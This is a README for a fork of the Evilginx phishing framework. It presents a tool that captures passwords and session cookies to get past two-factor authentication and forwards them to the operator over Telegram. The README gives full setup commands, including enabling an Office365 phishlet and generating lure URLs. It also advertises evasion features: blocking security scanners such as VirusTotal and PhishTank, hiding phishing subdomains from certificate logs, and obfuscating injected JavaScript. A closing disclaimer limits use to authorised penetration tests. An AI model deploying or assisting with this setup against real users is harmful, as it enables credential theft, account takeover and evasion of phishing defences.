# 🦊 EVILGINX3 — TELEGRAM EDITION

**The Advanced Man-in-the-Middle Attack Framework with 2FA Bypass & Real-Time Telegram Alerts**

<p align="center">
  <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/logo.png" alt="Evilginx2 Logo" width="180">
</p>

<p align="center">
  <a href="https://t.me/officialmonsterz"><img src="https://img.shields.io/badge/Telegram-@officialmonsterz-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram"></a>
  <a href="mailto:shapads@tutamail.com"><img src="https://img.shields.io/badge/Email-shapads@tutamail.com-red?style=for-the-badge&logo=mail.ru&logoColor=white" alt="Email"></a>
  <a href="https://github.com/officialmonsterz/evilginx2"><img src="https://img.shields.io/badge/GitHub-officialmonsterz-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub"></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-3.3.0-brightgreen?style=flat-square" alt="Version">
  <img src="https://img.shields.io/badge/Go-1.23-00ADD8?style=flat-square&logo=go" alt="Go">
  <img src="https://img.shields.io/badge/Database-BuntDB-orange?style=flat-square" alt="BuntDB">
  <img src="https://img.shields.io/badge/Docker-~18MB-2496ED?style=flat-square&logo=docker&logoColor=white" alt="Docker">
  <img src="https://img.shields.io/badge/Wildcard-DNS%20SSL%20Ready-brightgreen?style=flat-square" alt="Wildcard SSL">
</p>

---

## 🧠 WHAT IS EVILGINX3?

**Evilginx3 is a man-in-the-middle attack framework that captures login credentials AND session cookies — even when 2FA (two-factor authentication) is enabled.**

Instead of trying to steal the 2FA code, it steals the **session cookie** — the digital "I'm already logged in" ticket. Once you have this cookie, you can import it into your browser and instantly log in as that user, with **zero need for a 2FA code**.

---

## ⚡ WHAT MAKES THIS FORK SPECIAL?

This fork by **@officialmonsterz** supercharges the original Evilginx with features that penetration testers actually need:

| Feature | What It Does |
|---------|-------------|
| **Telegram Notifications** | Credentials hit your phone within seconds — no more staring at terminals |
| **Web Dashboard** | Browser-based UI to view, search, filter, and export captured sessions |
| **BuntDB Database** | Embedded, zero-config database — no MySQL/PostgreSQL needed |
| **Wildcard SSL** | One cert covers all subdomains — hides phishlets from Certificate Transparency logs |
| **Cloudflare Turnstile** | "I'm not a robot" CAPTCHA before victims see the phishing page |
| **Bot Protection** | Blocks VirusTotal, URLScan, crawlers, and scanners with 30+ detection signals |
| **Live Feed** | Real-time WebSocket feed showing events as they happen |
| **Header Stripping** | Removes Evilginx fingerprints from HTTP traffic (OPSEC improvement) |
| **JS Obfuscation** | Injected JavaScript is base64+eval-obfuscated to evade detection |
| **Docker Build** | Multi-stage Alpine build produces an ~18MB image |
| **Systemd Services** | Auto-start on boot, restart on crash |

---

## ✨ FEATURES DEEP DIVE

### 📱 Telegram Notifications

When credentials are captured, you get an instant Telegram message with:
- Username and password
- Cookies and tokens (attached as a `.txt` file for import)
- IP address and user-agent
- Landing URL

Only **one message per session** — if more tokens are captured, the same message is updated (not a new message flooding your chat).

### 📊 Web Dashboard

Access from any browser at `http://YOUR_IP:5000`:

- **Search** — find sessions by username, password, IP
- **Filter** — show only specific phishlets
- **Export** — download all sessions as CSV or JSON
- **Dark Mode** — toggle dark/light theme
- **Pagination** — navigate through hundreds of sessions
- **Delete** — remove individual sessions

### 🔒 Wildcard SSL Support

Without a wildcard cert, each subdomain (`login.yourdomain.com`, `accounts.yourdomain.com`) gets a separate Let's Encrypt certificate, and all subdomains appear in public Certificate Transparency logs (crt.sh). With a wildcard cert, only `yourdomain.com` appears — subdomains stay hidden.

### 🛡️ Bot Protection

Blocks over 30 categories of scanners and bots:
- **Security scanners:** VirusTotal, URLScan, PhishTank
- **Headless browsers:** Puppeteer, Selenium, PhantomJS
- **Network scanners:** Zgrab, Nuclei, Nmap, SQLMap
- **HTTP libraries:** Python-requests, curl, wget
- **Crawlers:** Ahrefs, Semrush, Majestic
- **Social media:** Facebook, Twitter, LinkedIn scrapers

### 💾 BuntDB Database

Zero configuration, no external database server needed:
- Single file database (`data.db`)
- No MySQL/PostgreSQL setup
- Automatic crash recovery
- Portable — just copy the file
- ~5MB memory footprint

### 🔧 RID Replacement

Change the tracking parameter from `rid` to anything:
- `user_id`
- `email_id`
- `campaign_id`
- `token`
- `ref`
- `data`
- `c`

---

## 🚀 QUICK START

### Prerequisites
- Ubuntu 20.04+ or Debian 11+ VPS
- Domain pointed to your server via Cloudflare (DNS Only — grey cloud)
- Telegram account (for notifications)

### One-Line Setup

```bash
# System update and install dependencies
apt update && apt install -y wget curl git make build-essential screen certbot ufw dnsutils

# Configure firewall
ufw allow 22/tcp && ufw allow 53/udp && ufw allow 80/tcp
ufw allow 443/tcp && ufw allow 5000/tcp && ufw allow 1337/tcp
ufw --force enable

# Free port 53 for Evilginx DNS
systemctl stop systemd-resolved && systemctl disable systemd-resolved
rm -f /etc/resolv.conf
echo "nameserver 1.1.1.1" > /etc/resolv.conf
chattr +i /etc/resolv.conf

# Install Go
cd ~ && wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc

# Clone and build
cd /root && git clone https://github.com/officialmonsterz/evilginx2.git
cd evilginx2 && go mod tidy && go build -o evilginx2 .
cd evilfeed && go build -o evilfeed . && cd ..

# Build Evilginx and Evilfeed
cd /root/evilginx2 && go build -o evilginx2 . && cd evilfeed && go build -o evilfeed .
```

### Configure Cloudflare (in browser)
1. Add your domain to Cloudflare (Free plan)
2. Change Namecheap nameservers to Cloudflare's
3. Add A records: `@` → your VPS IP, `*` → your VPS IP (both DNS Only — grey cloud)
4. SSL/TLS → Full (not Full Strict)

### Get Wildcard Certificate

```bash
certbot certonly --manual --preferred-challenges dns \
  -d '*.yourdomain.com' -d yourdomain.com
```

Add the TXT record in Cloudflare DNS, verify with `dig`, then press Enter.

### Copy Certificate and Start

```bash
mkdir -p /root/.evilginx/crt/wildcard
cp /etc/letsencrypt/live/yourdomain.com/fullchain.pem /root/.evilginx/crt/wildcard/
cp /etc/letsencrypt/live/yourdomain.com/privkey.pem /root/.evilginx/crt/wildcard/

./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass123 -feed
```

### Configure inside Evilginx terminal:
```
config domain yourdomain.com
config ipv4 external YOUR_VPS_IP
config autocert off
config unauth_url https://www.google.com
config teletoken YOUR_TELEGRAM_BOT_TOKEN
config chatid YOUR_CHAT_ID
test telegram
phishlets hostname office365 yourdomain.com
phishlets enable office365
lures create office365
lures get-url 0
```

---

## 🐳 DOCKER SUPPORT

```bash
# Build
docker build -t evilginx2-telegram .

# Run
docker run -d \
  --name evilginx2 \
  --restart unless-stopped \
  -p 53:53/udp \
  -p 80:80 \
  -p 443:443 \
  -p 5000:5000 \
  -v evilginx-data:/home/evilginx/.evilginx \
  evilginx2-telegram \
  -dashboard 0.0.0.0:5000 \
  -dashboard-user admin \
  -dashboard-pass YOUR_PASSWORD
```

---

## 📊 FEATURE COMPARISON MATRIX

| Feature | Original Evilginx | This Fork |
|---------|:-----------------:|:---------:|
| MITM Proxy Engine | ✅ | ✅ Enhanced |
| SSL / Autocert | ✅ | ✅ Wildcard Support |
| Phishlet System | ✅ | ✅ |
| Built-in DNS Server | ✅ | ✅ |
| **Telegram Notifications** | ❌ | ✅ |
| **Web Dashboard** | ❌ | ✅ |
| **BuntDB Database** | ❌ | ✅ |
| **Live Feed** | ❌ | ✅ |
| **Cloudflare Turnstile** | ❌ | ✅ |
| **Wildcard SSL** | ❌ | ✅ |
| **Bot Protection (30+ signals)** | ❌ | ✅ |
| **Header Stripping (OPSEC)** | ❌ | ✅ |
| **URL Rewriting** | ❌ | ✅ |
| **JS Obfuscation** | ❌ | ✅ |
| **Auto-Export (JSON/CSV)** | ❌ | ✅ |
| **Docker (~18MB Alpine)** | ❌ | ✅ |
| **Systemd Support** | ❌ | ✅ |
| **RID Replacement Scripts** | ❌ | ✅ |

---

## 📁 REPOSITORY STRUCTURE

```
├── main.go                    # Entry point
├── core/                      # Core engine
│   ├── http_proxy.go         # MITM proxy (bot protection, header stripping, URL rewriting, JS obfuscation)
│   ├── session.go            # In-memory session management
│   ├── config.go             # Configuration (Telegram, StripHeaders, etc.)
│   ├── notify.go             # Telegram notification logic
│   ├── telegram_queue.go     # Async notification queue
│   ├── tele.go               # Telegram API calls
│   ├── telegram_escape.go    # MarkdownV2 escaping
│   ├── tsession.go           # Telegram session struct
│   ├── dashboard.go          # Web dashboard + REST API
│   ├── auto_export.go        # Auto-export to JSON/CSV
│   ├── whitelist.go          # IP whitelist
│   ├── nameserver.go         # DNS server
│   ├── certdb.go             # SSL certificate management
│   ├── blacklist.go          # IP blacklist
│   ├── phishlet.go           # Phishlet engine
│   ├── terminal.go           # CLI interface
│   ├── http_server.go        # HTTP server (Turnstile + ACME)
│   └── gophish.go            # Gophish integration
├── database/                  # Persistence layer
│   ├── database.go           # BuntDB wrapper
│   └── db_session.go         # Session CRUD operations
├── evilfeed/                  # Live Feed application
│   ├── evilfeed.go           # WebSocket server
│   ├── hub.go                # WebSocket hub
│   └── app/                  # Frontend files
├── phishlets/                 # YAML phishing templates
├── redirectors/               # HTML redirector pages
├── Dockerfile                 # Multi-stage Alpine build
├── docker-compose.yml         # Docker Compose
├── setup_rid.sh               # RID replacement script
├── replace_rid.sh             # RID replacement script
├── DEPLOYMENT.md              # Full deployment guide
└── README.md                  # This file
```

---

## 🔧 CONFIGURATION REFERENCE

### Command-Line Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-dashboard` | `0.0.0.0:5000` | Dashboard listen address |
| `-dashboard-user` | `admin` | Dashboard username |
| `-dashboard-pass` | `""` | Dashboard password |
| `-feed` | `false` | Enable live feed |
| `-turnstile` | `""` | Turnstile `SITEKEY:SECRETKEY` |
| `-p` | `./phishlets` | Phishlets directory |
| `-t` | `./redirectors` | Redirectors directory |
| `-debug` | `false` | Enable debug output |
| `-developer` | `false` | Self-signed certs for dev |
| `-c` | `~/.evilginx` | Config directory |

### Console Commands

| Category | Commands |
|----------|----------|
| Config | `config domain`, `config ipv4`, `config unauth_url`, `config autocert`, `config chatid`, `config teletoken`, `config strip_headers`, `config telegram test` |
| Phishlets | `phishlets hostname`, `phishlets enable`, `phishlets disable`, `phishlets hide`, `phishlets unhide` |
| Lures | `lures create`, `lures get-url`, `lures edit`, `lures delete`, `lures pause`, `lures unpause` |
| Sessions | `sessions`, `sessions delete`, `sessions <id>` |
| Blacklist | `blacklist all`, `blacklist unauth`, `blacklist noadd`, `blacklist off` |
| System | `test-certs`, `clear`, `help`, `exit` |

---

## ⚖️ DISCLAIMER

Evilginx should be used only in legitimate penetration testing assignments with **written permission** from the parties being tested. Unauthorized use is illegal and unethical. The author and contributors assume no liability for misuse.

This work is a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect against this type of phishing.

---

## 👏 CREDITS

| Contribution | Author |
|-------------|--------|
| Telegram Integration, Dashboard, Database, Docker, Bot Protection, Header Stripping, URL Rewriting, JS Obfuscation, Dynamic unauth_url, Wildcard SSL, IP Whitelist | **@officialmonsterz** ([GitHub](https://github.com/officialmonsterz/evilginx2) / [Telegram](https://t.me/officialmonsterz) / shapads@tutamail.com) |
| Original Evilginx2/3 Core Framework | **Kuba Gretzky (@mrgretzky)** at [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) |

### Get Help
- Telegram: [t.me/officialmonsterz](https://t.me/officialmonsterz)
- Email: shapads@tutamail.com
- GitHub Issues: [github.com/officialmonsterz/evilginx2/issues](https://github.com/officialmonsterz/evilginx2/issues)
